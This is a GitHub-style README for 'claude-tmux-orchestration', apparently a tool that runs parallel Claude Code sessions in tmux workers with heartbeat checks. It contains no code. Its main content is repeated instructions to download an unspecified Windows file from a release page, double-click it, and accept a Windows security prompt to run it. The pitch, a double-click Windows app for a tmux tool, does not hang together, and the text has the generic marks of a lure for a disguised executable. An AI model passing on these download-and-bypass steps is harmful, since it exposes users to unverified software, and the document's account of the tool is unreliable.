# 🤖 claude-tmux-orchestration - Run parallel AI sessions with ease

[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/Psychical-mls439/claude-tmux-orchestration/releases)

## 🚀 What this app does

Claude tmux orchestration helps you run more than one Claude Code session at the same time. It starts each session as a separate worker, keeps track of them, and uses file-based coordination so they can share work without confusion.

Use it when you want to split a task into smaller parts, keep several AI sessions active, and watch their status from one place. It is built for Windows users who want a simple way to launch and manage parallel AI work.

## 📥 Download and install

1. Open the [release page](https://github.com/Psychical-mls439/claude-tmux-orchestration/releases)
2. Find the latest release
3. Download the Windows file from the Assets section
4. Save the file to a folder you can find again, such as Downloads or Desktop
5. If the file is a ZIP, right-click it and choose Extract All
6. Open the extracted folder
7. Double-click the app or launcher file to start it

If Windows shows a security prompt, choose the option that lets you run the file.

## 🖥️ Before you run it

This app works best on Windows 10 or Windows 11.

You may also need:

- A current Windows update
- Enough free space for logs and worker files
- A stable internet connection for Claude Code access
- Permission to run terminal-based tools
- A folder where the app can write files

If you plan to use many workers at once, give the app more memory and keep other heavy apps closed.

## 🧭 First launch

When you start the app for the first time, it sets up its working files and prepares the orchestration layer.

What you may see:

- A main window or terminal window
- Worker session names
- Heartbeat checks
- File paths for coordination data
- Status updates for each active session

Let the app finish its first setup step before you start adding work.

## ⚙️ How it works

The app uses a simple worker model.

- One main controller starts the sessions
- Each Claude Code session runs in its own tmux worker
- Heartbeat checks confirm that each worker is still active
- Shared files help workers pass work and status
- Orchestration rules keep sessions from stepping on each other

This setup helps when one task is too large for a single session. You can divide the work across several sessions and track them together.

## 🔄 Typical workflow

1. Start the app
2. Create or load a work session
3. Add tasks for each worker
4. Let the app start parallel Claude Code sessions
5. Watch heartbeat status and task progress
6. Review the output files when the work is done

You can use it for:

- Split coding tasks
- Research across several threads
- Review and cleanup work
- Step-by-step task queues
- Parallel file checks

## 📁 Files and folders

The app may create folders like these:

- `sessions` for active worker data
- `logs` for run history and errors
- `queue` for shared task files
- `heartbeat` for live status checks
- `output` for results from each worker

Do not move these files while the app is running. If you need to back up your work, copy the full project folder after you close the app.

## 🛠️ Common setup tips

If the app does not start:

- Check that you downloaded the latest release
- Make sure the file is fully extracted
- Try running it from a simple folder path, such as `C:\ClaudeTools\`
- Avoid folders with special characters
- Run it again after restarting Windows

If worker sessions do not appear:

- Wait a few seconds for startup
- Check whether the app has permission to open terminal windows
- Look in the logs folder for session status
- Make sure tmux support is available in the package you downloaded

## 🔐 Safety and control

This app gives you control over how many AI sessions run, what they work on, and where the files go.

Good habits:

- Review task text before starting workers
- Keep one folder per project
- Watch the heartbeat status during long runs
- Save important output files after each session
- Close the app only after workers finish

## 🧪 Example use case

You want to review a large codebase.

1. Start three worker sessions
2. Give one worker search tasks
3. Give one worker cleanup tasks
4. Give one worker summary tasks
5. Let the heartbeat monitor check that all sessions stay active
6. Collect the output files in the results folder

This saves time and keeps each session focused on one job.

## 📌 Project info

- Repository: `claude-tmux-orchestration`
- Description: Claude Code tmux orchestration with parallel AI workers, heartbeat monitoring, and file-based coordination
- Topics: ai-agents, automation, claude-code, developer-tools, mcp, orchestration, parallel-sessions, tmux

## 🧩 Basic troubleshooting

If the app opens and closes right away:

- Start it from a terminal window if one is included
- Check whether Windows blocked the file
- Confirm that the release file matches your Windows version
- Re-download the file if it looks incomplete

If output files are missing:

- Check the `output` folder
- Make sure the app finished the task
- Confirm that each worker had a valid session name
- Look in the `logs` folder for file path issues

## 📦 Download again

Use the release page here if you need the latest file or a fresh copy:

[https://github.com/Psychical-mls439/claude-tmux-orchestration/releases](https://github.com/Psychical-mls439/claude-tmux-orchestration/releases)

## 🧠 What to expect during use

- Fast session setup
- Several workers running at once
- Clear session status
- Heartbeat tracking
- Shared file coordination
- Output files for later review